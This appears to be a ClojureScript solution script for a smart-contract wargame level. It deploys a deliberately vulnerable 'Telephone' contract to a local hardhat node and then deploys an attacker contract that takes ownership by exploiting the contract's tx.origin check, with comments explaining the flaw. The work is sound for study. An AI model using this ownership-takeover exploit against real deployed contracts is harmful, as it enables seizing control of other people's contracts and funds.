(ns telephone
  (:require [wallets :as w]
            [utils :as u]))

(def telephone (atom ""))



(comment

  ;; deploy to local hardhat node for testing
  ;; and get it's address
  (-> (.deploy (u/contract :telephone w/local-wallet))
      (.then #(reset! telephone %))
      (.catch #(.log js/console %)))


  ;; deploy attacker contract
  ;; with required address, we are exploiting the contract
  ;; in the attacker's constructor
  ;;
  ;; `(tx.origin != msg.sender)` this is the most critical line
  ;; if we call the Telephone contract from an EOA:
  ;;
  ;; tx.orgin == msg.sender
  ;;
  ;; to make them unequal we used an attacker contract to call the
  ;; changeOwner function!
  (-> (.deploy
       (u/contract :telephone/attack
                   w/local-wallet)
       (.-address @telephone)
       (.-address w/local-wallet))
      (.then (fn [attacker]
               (-> attacker .-deployTransaction .wait)))
      (.then (fn [_]
               (.owner @telephone)))

      (.then (fn [owner]
               (.log js/console
                     (str "expected: "
                          (.-address w/local-wallet)
                          " got: "
                          owner))))

      (.catch #(.log js/console %)))

  )
